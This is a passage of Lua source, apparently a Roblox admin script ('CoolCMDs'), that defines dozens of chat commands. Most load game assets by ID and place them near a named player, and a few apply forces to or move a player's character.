g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gravgun2", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(44706976) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ds", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(43335275) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("stealer", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(43335057) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ragdoll", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(43335034) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("soulstaff", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41690515) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("headspistol", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41690494) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("playerctr", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41690453) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rm", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41690460) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("broom", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41690430) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jet2", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41693032) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ray", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39033770) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("hover", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(38103934) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("skate", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41079259) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mage", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37674333) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("adminscript", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37672841) 
g.Parent = player.Character
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("superclear", 5, function(msg, MessageSplit, Speaker, Self)
g = game:GetService("InsertService"):LoadAsset(65774624) 
g.Parent = game.Workspace
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("orbgui", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(65733099):GetChildren()[1]
g.Parent = player.PlayerGui
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("admingui", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(65728459):GetChildren()[1]
g.Parent = player.PlayerGui
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("privateservergui", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(65775052):GetChildren()[1]
g.Parent = player.PlayerGui
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fullprotection", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(65774563):GetChildren()[1]
g.Owner.Value = player.Name
g.Disabled = false
g.Parent = workspace
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fly", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
b = Instance.new("BodyForce") 
b.Parent = player.Character.Head 
b.force = Vector3.new(0,100000,0) 
wait(1) 
b.force = Vector3.new(0,1,0) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("up", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
b = Instance.new("BodyForce") 
b.Parent = player.Character.Head 
b.force = Vector3.new(0,1000000,0) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("launch", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
b = Instance.new("BodyForce") 
b.Parent = player.Character.Head 
b.force = Vector3.new(1000000,100000,0) 
wait(1) 
b.force = Vector3.new(1,1,0) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("punch", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
b = Instance.new("BodyForce") 
b.Parent = player.Character.Head 
b.force = Vector3.new(900000000000,-1,0) 
wait(1) 
b.force = Vector3.new(1,1,0) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("skydive", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
player.Character:MoveTo(Vector3.new(math.random(0,50),4000, math.random(0,50))) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("skull", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33305967) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("claws", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(30822045) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("je2", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41693032) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rocket", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41079884) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cannon", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(38148799) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("ghost", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(38149133) 
g.Parent = player.Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("vampire", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(21202070) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("pokeball", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(27261854) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("scepter", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(35682284) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wallwalker", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(35683911) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("roboarm", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(35366215) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("hypno", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(35366155) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("spin", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(35293856) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wann", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(27860496) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("platgun", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(34898883) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("lol", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33056562) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("halo", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33056994) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mario", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33056865) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fireemblem", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33057421) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("mule", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33057363) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("pokemon", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33057705) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("starfox", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33057614) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("inject", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(22774254) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("flamethrower", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32153028) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fstaff", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32858741) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("istaff", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32858662) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("fsword", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32858699) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("isword", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32858586) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("gstaff", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33382711) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("detinator", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33383241) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("eyeball", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(36186052) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("insert", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(21001552) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("tools", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37467248) 
g.Parent = player.Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("buildt", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41077772) 
g.Parent = player.Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sonic", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(41077941) 
g.Parent = player.Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("power", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37470897) 
g.Parent = player.Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rickroll", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32812583) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("drone", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(36871946) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("pismove", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37303754) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("rifle", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39034169) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("edge", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(39034068) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("portal", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37007768) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("wand", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(43335187) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("soulgun", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(36874821) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("bangun", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(40850644) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("windsoffjords", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32736432) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("tv", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33217480) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("scent", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(33240689) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cframe", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32718282) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jail", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32736079) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("jet", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37363526) 
g.Parent = player.Backpack
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nuke", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(32146440) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("werewolf", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(21202387) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("frost", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(26272081) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("vulcan", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(3086051) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("doom", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37778176) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("nshield", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37744930) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("slime", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37746254) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("star", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37720482) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("morpher", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37775802) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("cleaner", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(29308073) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("zombiestaff", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(37787732) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("phone", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
g = game:GetService("InsertService"):LoadAsset(27261508) 
g.Parent = game.Workspace 
g:MoveTo(player.Character.Torso.Position) 
end 
end 
end, "None", "None", "None")

CoolCMDs.Functions.CreateCommand("sword1", 5, function(msg, MessageSplit, Speaker, Self)
for word in msg:gmatch("%w+") do 
local player = matchPlayer(word) 
if (player ~= nil) then 
